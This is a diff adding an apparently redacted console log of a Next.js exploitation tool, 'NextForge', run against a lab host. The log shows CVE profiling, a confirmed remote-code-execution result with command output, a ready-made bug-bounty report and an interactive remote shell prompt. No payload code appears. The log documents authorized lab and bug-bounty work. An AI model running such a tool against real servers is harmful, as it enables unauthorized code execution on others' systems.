@@ -1,0 +1,66 @@
+# Redacted NextForge lab session
+# Target identifiers stripped. Output class preserved.
+# Authorized lab host only.
+
+python3 nextforge.py -t https://lab.nextforge.local/ --mode rce --auto
+══════════════════════════════════════════════════════════════
+  NextForge v2.1  — Unified Next.js Exploitation Framework
+  RCE · SSRF · Middleware · Full WAF Matrix · Auto Shell
+  CVE-2026-44578 · 55182 · 66478 · 29927 · 44575 · 44574 · 64642
+  @mitsec / ynsmroztas
+══════════════════════════════════════════════════════════════
+
+[>] Profiling https://lab.nextforge.local
+  Next.js unknown | App Router | MW=False | Turbo=False
+  Potential: CVE-2025-55182, CVE-2025-66478, CVE-2026-44575, CVE-2026-44578
+[>] Probing RCE (full WAF matrix)
+[>] Probing SSRF (CVE-2026-44578)
+[>] Probing middleware / auth bypass matrix (FULL)
+[>] Probing 2026-07/08 extras (64643 / 64649 / 75604)
+[!] CVE-2026-64649 exploit ready but --oast missing. Re-run with --oast xyz.oastify.com
+
+████████████████████████████████████████████████████████████
+  ⚡ RCE CONFIRMED — standard
+████████████████████████████████████████████████████████████
+
+  uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup)
+[+] Evidence saved: evidence/lab.nextforge.local_CVE-2025-55182_rce_standard_[REDACTED].txt
+
+  ┌─ PoC / Curl
+  │ # RCE confirmed via WAF mode: standard
+  │ # Use NextForge interactive shell for further commands:
+  │ python3 nextforge.py -t https://lab.nextforge.local --mode rce --auto
+  └──────────────────────────────────────────────────
+
+────────────────────────────────────────────────────────────
+  REPORT SNIPPET  (copy for Intigriti/Bugcrowd)
+────────────────────────────────────────────────────────────
+  ## CVE-2025-55182 / CVE-2025-66478
+
+  **Severity:** Critical
+  **Target:** `https://lab.nextforge.local`
+  **Detail:** RCE via RSC Flight deserialization (mode=standard)
+
+  ### Steps to Reproduce
+  1. Send the following request(s):
+  ```bash
+  python3 nextforge.py -t https://lab.nextforge.local --mode rce --auto
+  ```
+  2. Observe unauthorized access / sensitive response.
+
+  ### Impact
+  Unauthenticated remote code execution on the Next.js server process.
+
+  ### Evidence
+  Saved to: `evidence/lab.nextforge.local_CVE-2025-55182_rce_standard_[REDACTED].txt`
+────────────────────────────────────────────────────────────
+
+════════════════════════════════════════════════════════════
+  GOD SHELL  (RCE)
+  https://lab.nextforge.local
+  help | exit
+════════════════════════════════════════════════════════════
+
+  uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup)
+
+  nextforge@rce>
